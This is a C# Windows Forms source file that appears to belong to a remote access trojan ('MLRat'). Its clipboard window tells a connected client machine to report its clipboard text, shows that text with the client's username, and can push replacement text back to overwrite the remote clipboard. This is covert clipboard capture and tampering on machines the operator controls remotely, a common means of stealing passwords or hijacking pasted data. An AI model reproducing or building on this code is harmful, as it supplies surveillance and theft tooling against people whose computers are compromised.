using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class formClipboard : Form
    {
        public IClient Client { get; set; }
        public formClipboard(IClient c)
        {
            InitializeComponent();
            Client = c;
            this.Text = string.Format("Clipboard ({0})", Client.GetVariable<string>("Username", ""));
        }

        public void SetClipboardText(string text)
        {
            Invoke((MethodInvoker)delegate ()
            {
                rtbClipboard.Text = text;
            });
        }

        private void formClipboard_Load(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.Clipboard, (byte)ClipboardCommand.GetText);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.Clipboard, (byte)ClipboardCommand.SetText, rtbClipboard.Text);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.Clipboard, (byte)ClipboardCommand.GetText);
        }
    }
}
